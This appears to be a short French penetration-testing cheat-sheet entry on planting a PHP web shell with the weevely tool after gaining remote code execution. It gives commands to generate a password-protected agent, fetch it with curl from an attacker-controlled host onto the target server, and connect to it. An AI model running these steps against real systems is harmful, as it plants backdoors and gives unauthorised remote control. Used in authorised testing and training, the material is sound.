# Web Shell

### PHP

L'outil [weevely](https://github.com/epinna/weevely3) permet d'avoir un _Web Shell_ parfaitement interactif quand la RCE ne permet pas de mettre en place un _Reverse Shell_ facilement.

```
# Générer l'agent :
./weevely.py generate password agent.php

# Uploader l'agent sur l'application Web (à réaliser depuis la RCE) :
curl http://<IP-HOTE>:8081/agent.php --output agent.php

# Réaliser une connexion vers l'agent :
./weevely.py http://<DOMAINE>/agent.php password
```
